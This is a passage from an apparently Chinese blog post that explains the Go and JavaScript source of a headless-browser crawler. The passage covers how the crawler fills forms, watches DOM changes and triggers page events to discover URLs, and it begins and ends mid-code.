class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> ParseResponseURL(v *network.EventResponseReceived) &#123;<br><span class="hljs-comment">// 通过请求 ID 获取响应内容</span><br><span class="hljs-keyword">defer</span> tab.WG.Done()<br>ctx := tab.GetExecutor()<br>res, err := network.GetResponseBody(v.RequestID).Do(ctx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;ParseResponseURL &quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>resStr := <span class="hljs-type">string</span>(res)<br>    <span class="hljs-comment">// 这里测试 https://identity-dev.schibsted.com/api/status 发现 json 响应中的路径被转义了</span><br><span class="hljs-comment">//resStr = strings.ReplaceAll(resStr, &quot;\\/&quot;, &quot;/&quot;) // json 类型的数据 string 后会 \/ 导致正则无法匹配</span><br>urlRegex := regexp.MustCompile(<span class="hljs-string">`(?s)`</span> + config.SuspectURLRegex)<br>urlList := urlRegex.FindAllString(resStr, <span class="hljs-number">-1</span>)<br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> urlList &#123;<br><span class="hljs-comment">// 去除首尾字符 =&gt; 可以优化</span><br>url = url[<span class="hljs-number">1</span> : <span class="hljs-built_in">len</span>(url)<span class="hljs-number">-1</span>]<br>url_lower := strings.ToLower(url)<br><span class="hljs-keyword">if</span> strings.HasPrefix(url_lower, <span class="hljs-string">&quot;image/x-icon&quot;</span>) || strings.HasPrefix(url_lower, <span class="hljs-string">&quot;text/css&quot;</span>) || strings.HasPrefix(url_lower, <span class="hljs-string">&quot;text/javascript&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 输出 =&gt; 添加到结果 url</span><br>tab.AddResultUrl(config.GET, url, config.FromJSFile)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后看下它这里注入的 JS 操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> AfterDOMRun() &#123;<br><span class="hljs-keyword">defer</span> tab.WG.Done()<br><br>logger.Logger.Debug(<span class="hljs-string">&quot;afterDOMRun start&quot;</span>)<br><span class="hljs-keyword">if</span> !tab.getBodyNodeId() &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;no body document NodeID, exit.&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>tab.domWG.Add(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">go</span> tab.fillForm() <span class="hljs-comment">// 表单填充</span><br><span class="hljs-keyword">go</span> tab.setObserverJS()<br>tab.domWG.Wait()<br>logger.Logger.Debug(<span class="hljs-string">&quot;afterDOMRun end&quot;</span>)<br>tab.WG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> tab.AfterLoadedRun()<br>&#125;<br></code></pre></td></tr></table></figure><p>表单填充 tab.fillForm() ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> fillForm() &#123;<br><span class="hljs-keyword">defer</span> tab.domWG.Done()<br>logger.Logger.Debug(<span class="hljs-string">&quot;fillForm start&quot;</span>)<br>tab.fillFormWG.Add(<span class="hljs-number">3</span>)<br>f := FillForm&#123;<br>tab: tab,<br>&#125;<br><span class="hljs-keyword">go</span> f.fillInput()<span class="hljs-comment">// input 标签</span><br><span class="hljs-keyword">go</span> f.fillMultiSelect()<span class="hljs-comment">// 多选框</span><br><span class="hljs-keyword">go</span> f.fillTextarea()<span class="hljs-comment">// 文本框</span><br><br>tab.fillFormWG.Wait()<br>logger.Logger.Debug(<span class="hljs-string">&quot;fillForm end&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下是怎么去实现填充的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f *FillForm)</span></span> fillInput() &#123;<br><span class="hljs-keyword">defer</span> f.tab.fillFormWG.Done()<br><span class="hljs-keyword">var</span> nodes []*cdp.Node<br>ctx := f.tab.GetExecutor()<br><br>tCtx, cancel := context.WithTimeout(ctx, time.Second*<span class="hljs-number">2</span>)<br><span class="hljs-keyword">defer</span> cancel()<br><span class="hljs-comment">// 首先判断input标签是否存在，减少等待时间 提前退出</span><br>inputNodes, inputErr := f.tab.GetNodeIDs(<span class="hljs-string">`input`</span>)<br><span class="hljs-keyword">if</span> inputErr != <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(inputNodes) == <span class="hljs-number">0</span> &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;fillInput: get form input element err&quot;</span>)<br><span class="hljs-keyword">if</span> inputErr != <span class="hljs-literal">nil</span> &#123;<br>logger.Logger.Debug(inputErr)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 获取所有的input标签</span><br>err := chromedp.Nodes(<span class="hljs-string">`input`</span>, &amp;nodes, chromedp.ByQueryAll).Do(tCtx)<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;get all input element err&quot;</span>)<br>logger.Logger.Debug(err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 找出 type 为空 或者 type=text</span><br><span class="hljs-keyword">for</span> _, node := <span class="hljs-keyword">range</span> nodes &#123;<br><span class="hljs-comment">// 兜底超时</span><br>tCtxN, cancelN := context.WithTimeout(ctx, time.Second*<span class="hljs-number">5</span>)<br>attrType := node.AttributeValue(<span class="hljs-string">&quot;type&quot;</span>)<br><span class="hljs-keyword">if</span> attrType == <span class="hljs-string">&quot;text&quot;</span> || attrType == <span class="hljs-string">&quot;&quot;</span> &#123;<br>inputName := node.AttributeValue(<span class="hljs-string">&quot;id&quot;</span>) + node.AttributeValue(<span class="hljs-string">&quot;class&quot;</span>) + node.AttributeValue(<span class="hljs-string">&quot;name&quot;</span>)<br>value := f.GetMatchInputText(inputName)<br><span class="hljs-keyword">var</span> nodeIds = []cdp.NodeID&#123;node.NodeID&#125;<br><span class="hljs-comment">// 先使用模拟输入</span><br>_ = chromedp.SendKeys(nodeIds, value, chromedp.ByNodeID).Do(tCtxN)<br><span class="hljs-comment">// 再直接赋值JS属性</span><br>_ = chromedp.SetAttributeValue(nodeIds, <span class="hljs-string">&quot;value&quot;</span>, value, chromedp.ByNodeID).Do(tCtxN)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> attrType == <span class="hljs-string">&quot;email&quot;</span> || attrType == <span class="hljs-string">&quot;password&quot;</span> || attrType == <span class="hljs-string">&quot;tel&quot;</span> &#123;<br>value := f.GetMatchInputText(attrType)<br><span class="hljs-keyword">var</span> nodeIds = []cdp.NodeID&#123;node.NodeID&#125;<br><span class="hljs-comment">// 先使用模拟输入</span><br>_ = chromedp.SendKeys(nodeIds, value, chromedp.ByNodeID).Do(tCtxN)<br><span class="hljs-comment">// 再直接赋值JS属性</span><br>_ = chromedp.SetAttributeValue(nodeIds, <span class="hljs-string">&quot;value&quot;</span>, value, chromedp.ByNodeID).Do(tCtxN)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> attrType == <span class="hljs-string">&quot;radio&quot;</span> || attrType == <span class="hljs-string">&quot;checkbox&quot;</span> &#123;<br><span class="hljs-keyword">var</span> nodeIds = []cdp.NodeID&#123;node.NodeID&#125;<br>_ = chromedp.SetAttributeValue(nodeIds, <span class="hljs-string">&quot;checked&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, chromedp.ByNodeID).Do(tCtxN)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> attrType == <span class="hljs-string">&quot;file&quot;</span> || attrType == <span class="hljs-string">&quot;image&quot;</span> &#123;<br><span class="hljs-keyword">var</span> nodeIds = []cdp.NodeID&#123;node.NodeID&#125;<br>wd, _ := os.Getwd()<br>filePath := wd + <span class="hljs-string">&quot;/upload/image.png&quot;</span><br>_ = chromedp.RemoveAttribute(nodeIds, <span class="hljs-string">&quot;accept&quot;</span>, chromedp.ByNodeID).Do(tCtxN)<br>_ = chromedp.RemoveAttribute(nodeIds, <span class="hljs-string">&quot;required&quot;</span>, chromedp.ByNodeID).Do(tCtxN)<br>_ = chromedp.SendKeys(nodeIds, filePath, chromedp.ByNodeID).Do(tCtxN)<br>&#125;<br>cancelN()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>获取到 input 之后再去判断需要填充的类型，根据类型选择不同的文本去填充：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240327161550750.png?imageSlim" alt="image-20240327161550750"></p><p>对于单选框，文件上传也做了对应的处理。</p><p>之后去注入 JS 去检测 Dom 变化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> setObserverJS() &#123;<br><span class="hljs-keyword">defer</span> tab.domWG.Done()<br>logger.Logger.Debug(<span class="hljs-string">&quot;setObserverJS start&quot;</span>)<br><span class="hljs-comment">// 设置 Dom 节点变化的观察函数</span><br><span class="hljs-keyword">go</span> tab.Evaluate(js.ObserverJS)<br>logger.Logger.Debug(<span class="hljs-string">&quot;setObserverJS end&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>JS 如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">init_observer_sec_auto_b</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-keyword">let</span> node = e.<span class="hljs-property">target</span>;<br>        <span class="hljs-comment">// 收集 src </span><br><span class="hljs-keyword">let</span> nodeListSrc = node.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;[src]&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> each <span class="hljs-keyword">of</span> nodeListSrc) &#123;<br><span class="hljs-keyword">if</span> (each.<span class="hljs-property">src</span>) &#123;<br>                <span class="hljs-comment">// 这里的 addLink 也是自定义的 就是去收集链接的</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addLink</span>(each.<span class="hljs-property">src</span>, <span class="hljs-string">&quot;DOM&quot;</span>);<br><span class="hljs-keyword">let</span> attrValue = each.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;src&quot;</span>);<br>                <span class="hljs-comment">// 如果是 javascript: 就执行后面的代码</span><br><span class="hljs-keyword">if</span> (attrValue.<span class="hljs-title function_">toLocaleLowerCase</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;javascript:&quot;</span>)) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">eval</span>(attrValue.<span class="hljs-title function_">substring</span>(<span class="hljs-number">11</span>));<br>&#125;<br><span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 收集 href</span><br><span class="hljs-keyword">let</span> nodeListHref = node.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;[href]&quot;</span>);<br>nodeListHref = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">randArr</span>(nodeListHref);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> each <span class="hljs-keyword">of</span> nodeListHref) &#123;<br><span class="hljs-keyword">if</span> (each.<span class="hljs-property">href</span>) &#123;<br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addLink</span>(each.<span class="hljs-property">href</span>, <span class="hljs-string">&quot;DOM&quot;</span>);<br><span class="hljs-keyword">let</span> attrValue = each.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;href&quot;</span>);<br><span class="hljs-keyword">if</span> (attrValue.<span class="hljs-title function_">toLocaleLowerCase</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;javascript:&quot;</span>)) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">eval</span>(attrValue.<span class="hljs-title function_">substring</span>(<span class="hljs-number">11</span>));<br>&#125;<br><span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;;<br>    <span class="hljs-comment">// 监测 dom 节点的变化 触发 window.dom_listener_func_sec_auto 也就是上面收集 src 和 href 的函数</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMNodeInserted&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMSubtreeModified&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMNodeInsertedIntoDocument&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMAttrModified&#x27;</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">dom_listener_func_sec_auto</span>, <span class="hljs-literal">true</span>);<br>&#125;)()<br></code></pre></td></tr></table></figure><p>表单填充完毕、Dom 检测 JS 注入之后，它会去调用 AfterLoadedRun 去触发页面的动作，触发动作是通过 JS 去完成的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tab *Tab)</span></span> AfterLoadedRun() &#123;<br><span class="hljs-keyword">defer</span> tab.WG.Done()<br>logger.Logger.Debug(<span class="hljs-string">&quot;afterLoadedRun start&quot;</span>)<br>tab.formSubmitWG.Add(<span class="hljs-number">2</span>)<br>tab.loadedWG.Add(<span class="hljs-number">3</span>)<br>tab.removeLis.Add(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">go</span> tab.formSubmit() <span class="hljs-comment">// 表单提交</span><br>tab.formSubmitWG.Wait()<br>logger.Logger.Debug(<span class="hljs-string">&quot;formSubmit end&quot;</span>)<br><span class="hljs-comment">// 异步</span><br><span class="hljs-keyword">if</span> tab.config.EventTriggerMode == config.EventTriggerAsync &#123;<br><span class="hljs-keyword">go</span> tab.triggerJavascriptProtocol()<br><span class="hljs-keyword">go</span> tab.triggerInlineEvents()<br><span class="hljs-keyword">go</span> tab.triggerDom2Events()<br>tab.loadedWG.Wait()<br><span class="hljs-comment">// 同步 按照一定的顺序</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> tab.config.EventTriggerMode == config.EventTriggerSync &#123;<br>tab.triggerInlineEvents()<br>time.Sleep(tab.config.EventTriggerInterval)<br>tab.triggerDom2Events()<br>time.Sleep(tab.config.EventTriggerInterval)<br>tab.triggerJavascriptProtocol()<br>&#125;<br><br><span class="hljs-comment">// 事件触发之后 需要等待一点时间让浏览器成功发出 ajax 请求 更新 DOM</span><br>time.Sleep(tab.config.BeforeExitDelay)<br><br><span class="hljs-keyword">go</span> tab.RemoveDOMListener()<br>tab.removeLis.Wait()<br>logger.Logger.Debug(<span class="hljs-string">&quot;afterLoadedRun end&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下用于触发动作的 JS 代码：</p><p>triggerJavascriptProtocol：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">click_all_a_tag_javascript</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">// 获取 href 节点列表</span><br><span class="hljs-keyword">let</span> nodeListHref = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;[href]&quot;</span>);<br>    <span class="hljs-comment">// 随机排列</span><br>nodeListHref = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">randArr</span>(nodeListHref);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> node <span class="hljs-keyword">of</span> nodeListHref) &#123;<br>        <span class="hljs-comment">// 获取属性值 如果是 javascript: 就会去执行后面的 JS 代码</span><br><span class="hljs-keyword">let</span> attrValue = node.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;href&quot;</span>);<br><span class="hljs-keyword">if</span> (attrValue.<span class="hljs-title function_">toLocaleLowerCase</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;javascript: &quot;</span>)) &#123;<br><span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">sleep</span>(%f);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">eval</span>(attrValue.<span class="hljs-title function_">substring</span>(<span class="hljs-number">11</span>));<br>&#125;<br><span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br>&#125;<br>    <span class="hljs-comment">// src 同理</span><br><span class="hljs-keyword">let</span> nodeListSrc = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;[src]&quot;</span>);<br>nodeListSrc = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">randArr</span>(nodeListSrc);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> node <span class="hljs-keyword">of</span> nodeListSrc) &#123;<br><span class="hljs-keyword">let</span> attrValue = node.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&quot;src&quot;</span>);<br><span class="hljs-keyword">if</span> (attrValue.<span class="hljs-title function_">toLocaleLowerCase</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;javascript:&quot;</span>)) &#123;<br><span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">sleep</span>(%f);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">eval</span>(attrValue.<span class="hljs-title function_">substring</span>(<span class="hljs-number">11</span>));<br>&#125;<br><span class="hljs-keyword">catch</span> &#123;&#125;<br>&#125;<br>&#125;<br>&#125;)()<br></code></pre></td></tr></table></figure><p>内联事件：triggerInlineEvents</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go">(async function trigger_all_inline_event()&#123;<br>    <span class="hljs-comment">// 一些内联事件名称</span><br>let eventNames = [<span class="hljs-string">&quot;onabort&quot;</span>, <span class="hljs-string">&quot;onblur&quot;</span>, <span class="hljs-string">&quot;onchange&quot;</span>, <span class="hljs-string">&quot;onclick&quot;</span>, <span class="hljs-string">&quot;ondblclick&quot;</span>, <span class="hljs-string">&quot;onerror&quot;</span>, <span class="hljs-string">&quot;onfocus&quot;</span>, <span class="hljs-string">&quot;onkeydown&quot;</span>, <span class="hljs-string">&quot;onkeypress&quot;</span>, <span class="hljs-string">&quot;onkeyup&quot;</span>, <span class="hljs-string">&quot;onload&quot;</span>, <span class="hljs-string">&quot;onmousedown&quot;</span>, <span class="hljs-string">&quot;onmousemove&quot;</span>, <span class="hljs-string">&quot;onmouseout&quot;</span>, <span class="hljs-string">&quot;onmouseover&quot;</span>, <span class="hljs-string">&quot;onmouseup&quot;</span>, <span class="hljs-string">&quot;onreset&quot;</span>, <span class="hljs-string">&quot;onresize&quot;</span>, <span class="hljs-string">&quot;onselect&quot;</span>, <span class="hljs-string">&quot;onsubmit&quot;</span>, <span class="hljs-string">&quot;onunload&quot;</span>];<br><span class="hljs-keyword">for</span> (let eventName of eventNames) &#123;<br>let event = eventName.replace(<span class="hljs-string">&quot;on&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>let nodeList = document.querySelectorAll(<span class="hljs-string">&quot;[&quot;</span> + eventName + <span class="hljs-string">&quot;]&quot;</span>);<br><span class="hljs-keyword">if</span> (nodeList.length &gt; <span class="hljs-number">100</span>) &#123;<br>nodeList = nodeList.slice(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br>&#125;<br>nodeList = window.randArr(nodeList);<br><span class="hljs-keyword">for</span> (let node of nodeList) &#123;<br>await window.sleep(%f);<br>            <span class="hljs-comment">// 触发事件</span><br>let evt = document.createEvent(<span class="hljs-string">&#x27;CustomEvent&#x27;</span>);<br>evt.initCustomEvent(event, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, null);<br>try &#123;<br>node.dispatchEvent(evt);<br>&#125;<br>catch &#123;&#125;<br>&#125;<br>&#125;<br>&#125;)()<br></code></pre></td></tr></table></figure><p>触发 DOM2 级事件 triggerDom2Events ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 定义一个立即执行的异步函数</span><br>(<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger_all_dom2_custom_event</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 定义一个函数，用于向下传递事件到子节点</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">transmit_child</span>(<span class="hljs-params">node, event, loop</span>) &#123;<br><span class="hljs-keyword">let</span> _loop = loop + <span class="hljs-number">1</span> <span class="hljs-comment">// 递归深度增加</span><br><span class="hljs-keyword">if</span> (_loop &gt; <span class="hljs-number">4</span>) &#123;<br><span class="hljs-keyword">return</span>; <span class="hljs-comment">// 如果递归深度超过4，则停止递归</span><br>&#125;<br><span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 确保节点是一个元素节点</span><br><span class="hljs-keyword">if</span> (node.<span class="hljs-property">hasChildNodes</span>) &#123;<br><span class="hljs-comment">// 随机选择一个子节点并尝试触发事件</span><br><span class="hljs-keyword">let</span> index = <span class="hljs-built_in">parseInt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()*node.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">try</span> &#123;<br>node.<span class="hljs-property">children</span>[index].<span class="hljs-title function_">dispatchEvent</span>(event);<br>&#125; <span class="hljs-keyword">catch</span>(e) &#123;&#125;<br><span class="hljs-comment">// 